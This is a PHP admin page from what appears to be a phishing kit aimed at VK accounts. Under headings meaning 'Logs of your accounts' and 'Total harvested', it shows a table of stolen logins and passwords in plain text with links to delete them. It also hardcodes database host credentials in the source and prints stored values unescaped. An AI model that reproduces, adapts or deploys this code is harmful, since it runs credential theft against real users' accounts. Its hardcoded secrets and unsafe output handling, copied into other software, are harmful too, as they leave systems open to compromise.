<?php session_start ();

if (!$_SESSION['admin']) die ( Запрещено );

?>
<?php

$link = mysql_connect("rudy.zzz.com.ua", "vkfish123", "1234567890Lzt");
mysql_select_db("vkfish123", $link);

$result = mysql_query("SELECT * FROM test", $link);
$num_rows = mysql_num_rows($result);
?>
<?php
/* Соединяемся с базой данных */
$hostname = "rudy.zzz.com.ua"; // название/путь сервера, с MySQL
$username = "vkfish123"; // имя пользователя (в Denwer`е по умолчанию "root")
$password = "1234567890Lzt"; // пароль пользователя (в Denwer`е по умолчанию пароль отсутствует, этот параметр можно оставить пустым)
$dbName = "vkfish123"; // название базы данных
 
/* Таблица MySQL, в которой хранятся данные */
$table = "test";
 
/* Создаем соединение */
mysql_connect($hostname, $username, $password) or die ("Не могу создать соединение");
 
/* Выбираем базу данных. Если произойдет ошибка - вывести ее */
mysql_select_db($dbName) or die (mysql_error());
 
if (isset($_GET['del'])) {
   $del = intval($_GET['del']);
   $query = "delete from $table where (id='$del')";
   /* Выполняем запрос. Если произойдет ошибка - вывести ее. */
   mysql_query($query) or die(mysql_error());
}
 
/* Заносим в переменную $res всю базу данных */
$query = "SELECT * FROM $table";
/* Выполняем запрос. Если произойдет ошибка - вывести ее. */
$res = mysql_query($query) or die(mysql_error());
/* Узнаем количество записей в базе данных */
$row = mysql_num_rows($res);
 
/* Выводим данные из таблицы */
echo ("
<html>
 
<head>
 
   <meta charset=»utf-8″ />
 
    <title>Админка</title>
 
<style type=\"text/css\">
<!--
h3 { font-size: 16px; text-align: center; }
td { padding: 3px; text-align: center; vertical-align: middle; }
.buttons { width: auto; border: double 1px #666666; background: #D6D6D6; }
-->
</style>
 
</head>
 
<body>
 
<div class=cont>
<center>
<p class=welog>Логи ваших аккаунтов:</p>
<p class=welog2>Всего добыто: $num_rows</p>
<a name=\"deleter\" href=\"delete.php\" class=knopka>Отчистить логи</a>
 <br><br>
<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">
 <tr style=\"border: solid 1px #000\">
  <td align=\"center\"><b>Логин</b></td>
  <td align=\"center\"><b>Пароль</b></td>
  <td align=\"center\"><b>Действия</b></td>
 </tr>
");
/* Цикл вывода данных из базы конкретных полей */
while ($row = mysql_fetch_array($res)) {
    echo "<tr>\n";
    echo "<td>".$row['login']."</td>\n";
    echo "<td>".$row['pass']."</td>\n";
    /* Генерируем ссылку для удаления поля */
    echo "<td><a name=\"del\" href=\"adminka.php?del=".$row["id"]."\" class=knopka2>Удалить</a></td>\n";
    echo "</tr>\n";
}
 
echo ("</div></table>\n");
 
/* Закрываем соединение */
mysql_close();
 
/* Выводим ссылку возврата */
 
    
?>

<style>
@font-face{

font-family: 'ProximaNova';

src: url('../assets/fonts/ProximaNova-Regular.eot');

src: url('../assets/fonts/ProximaNova-Regular.eot?iefix') format('eot'),

url('../assets/fonts/ProximaNova-Regular.woff') format('woff'),

url('../assets/fonts/ProximaNova-Regular.ttf') format('truetype'),

url('../assets/fonts/ProximaNova-Regular.svg#webfont') format('svg');

font-weight: normal;

font-style: normal;

}
    p {
        margin:0;
        padding:0;
    }
    body {
    font-family: ProximaNova;
    background: #272632;
    }
    .welog {
        font-size:30px;
        color:white;
        
    }
        .welog2 {
        font-size:30px;
        color:white;
            margin-bottom:32px;
        
    }
    .cont {
        width:750px;
        margin:0 auto;
        padding-top:30px;
    }
    table { 
        border-radius:18px;
        font-size:17px;
        width: 477px; 
        margin: 0px auto; 
        background-color: #feb856;
        box-shadow:0px 0px 3px 1px black;
        color:#272632;
        
    }
        .knopka {
    border: none;
    font-size: 18px;
    color: white;
    background-color: #d03352;
    border-radius: 25px;
    padding: 6px 180px;
    text-decoration: none;
    box-shadow:0px 0px 3px 1px black;
    margin:5px 5px;
    }
    .knopka:hover {
     background-color: #D93656;
    }
            .knopka2 {
    border: none;
    font-size: 14px;
    color: white;
    background-color: #d03352;
    border-radius: 25px;
    padding: 3px 45px;
    text-decoration: none;
    box-shadow:0px 0px 3px 1px black;
    margin:5px 5px;
    }
    .knopka2:hover {
     background-color: #D93656;
    }
    tr {
        height:36px;
    }
</style>